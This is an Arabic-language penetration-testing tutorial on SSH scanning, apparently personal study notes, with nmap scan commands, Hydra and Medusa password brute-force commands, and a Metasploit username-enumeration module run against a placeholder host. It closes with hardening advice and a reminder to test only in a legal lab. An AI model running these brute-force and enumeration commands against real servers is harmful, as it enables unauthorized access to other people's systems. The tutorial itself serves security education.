### 🔥 **SSH Scanning - شرح عميق وبسيط مع خطوات عملية** 🔥

## ✅ **ما هو SSH؟**

**SSH (Secure Shell)** هو بروتوكول يستخدم للوصول الآمن إلى الأجهزة عن بُعد وإدارة الخوادم. يعمل على **المنفذ 22 افتراضيًا**، ويوفر **تشفيرًا قويًا** لحماية البيانات أثناء الاتصال.

#### **🔹 الاستخدامات الشائعة لـ SSH:**

- إدارة الخوادم عن بُعد.
- نقل الملفات باستخدام **SCP أو SFTP**.
- تشغيل الأوامر عبر **Shell** بشكل آمن.

---

## **⚠️ لماذا يعتبر SSH نقطة اختبار أمني هامة؟**

1️⃣ إذا كان SSH مفتوحًا، فقد يكون **عرضة لهجمات تخمين كلمات المرور (Brute-force Attacks)**.  
2️⃣ بعض الإعدادات السيئة مثل **السماح بتسجيل الدخول باسم Root** قد تسهل الاختراق.  
3️⃣ وجود ثغرات في بعض **إصدارات OpenSSH** قد يسمح للمهاجم بتنفيذ هجمات مختلفة.

---

## **🛠️ أدوات وأوامر لفحص SSH بالتفصيل**

### 🔎 **1️⃣ اكتشاف ما إذا كان SSH مفتوحًا**

📌 **استخدام [[Nmap]] لفحص المنفذ 22:**

```bash
nmap -p 22 target.com
```

**🔹 النتيجة:**

- إذا كان المنفذ **مفتوحًا (open)**، فهذا يعني أن SSH يعمل ويمكن الوصول إليه عن بُعد.

#### ✅ **الخلاصة:**

إذا كان SSH متاحًا للجميع، فيجب التأكد من أنه محمي جيدًا لتجنب الهجمات.

---

### 🔎 **2️⃣ اكتشاف إصدار SSH المستخدم**

📌 **استخدام Nmap لمعرفة إصدار SSH:**

```bash
nmap -p 22 --script=ssh-hostkey target.com
```

أو

```bash
nmap -p 22 --script=ssh2-enum-algos target.com
```

**🔹 النتيجة:**

- يعرض إصدار **OpenSSH** أو أي برنامج SSH آخر المستخدم في الخادم.

#### ✅ **الخلاصة:**

معرفة الإصدار تساعد في **البحث عن الثغرات** المحتملة في SSH واستغلالها إذا كان غير محدّث.

---

### 🔎 **3️⃣ البحث عن ثغرات SSH**

📌 **استخدام Nmap للبحث عن ثغرات SSH الشائعة:**

```bash
nmap --script=ssh-vuln* -p 22 target.com
```

**🔹 النتيجة:**

- يحدد إذا كان الخادم يستخدم إصدارًا ضعيفًا من SSH.
- قد يكشف عن ثغرات مثل **CVE-2018-15473** التي تسرب أسماء المستخدمين.

#### ✅ **الخلاصة:**

إذا كان SSH يعمل بإصدار ضعيف، فيجب تحديثه فورًا لمنع أي استغلال.

---

### 🔎 **4️⃣ تجربة هجوم Brute-force على SSH**

📌 **استخدام [[Hydra]] لتجربة كلمات مرور ضعيفة:**

```bash
hydra -L users.txt -P passwords.txt ssh://target.com
```

📌 **أو باستخدام [[Medusa]]:**

```bash
medusa -h target.com -u root -P passwords.txt -M ssh
```

**🔹 النتيجة:**

- إذا تم العثور على كلمة مرور صحيحة، يمكن تسجيل الدخول إلى SSH.

#### ✅ **الخلاصة:**

إذا كان SSH يسمح بكلمات مرور ضعيفة، فهو معرض للاختراق بسهولة.

---

### 🔎 **5️⃣ استخراج أسماء المستخدمين في SSH**

📌 **استخدام [[Metasploit]] لمعرفة أسماء المستخدمين:**

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts target.com
set user_file users.txt
exploit
```

**🔹 النتيجة:**

- يحدد أسماء المستخدمين المسجلين على الخادم.

#### ✅ **الخلاصة:**

معرفة أسماء المستخدمين تسهل تنفيذ **هجمات Brute-force** على SSH.

---

## **🚀 خطوات عملية لاختبار اختراق SSH (SSH Penetration Testing)**

### ✅ **1️⃣ فحص SSH ومعرفة إذا كان مفتوحًا**

```bash
nmap -p 22 target.com
```

### ✅ **2️⃣ اكتشاف إصدار SSH والبحث عن ثغرات**

```bash
nmap -p 22 --script=ssh-hostkey target.com
nmap --script=ssh-vuln* -p 22 target.com
```

### ✅ **3️⃣ البحث عن أسماء المستخدمين**

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts target.com
set user_file users.txt
exploit
```

### ✅ **4️⃣ تجربة كلمات مرور ضعيفة باستخدام Hydra**

```bash
hydra -L users.txt -P passwords.txt ssh://target.com
```

---

## 🔥 **📌 الخلاصة النهائية عن SSH Scanning**

1️⃣ إذا كان SSH مفتوحًا، فقد يكون معرضًا لهجمات التخمين.  
2️⃣ معرفة إصدار SSH تساعد في البحث عن **الثغرات الأمنية**.  
3️⃣ بعض الإعدادات السيئة مثل **السماح بتسجيل الدخول بـ Root** تجعل SSH نقطة ضعف.  
4️⃣ الحل: **تعطيل تسجيل الدخول بـ Root، استخدام مفاتيح SSH بدلًا من كلمات المرور، تحديث SSH، وتحديد IPs المسموح لها بالاتصال.**

🔥 **🚀 جرب الأدوات بنفسك في بيئة اختبار قانونية واستفد منها في تأمين الأنظمة!** 🚀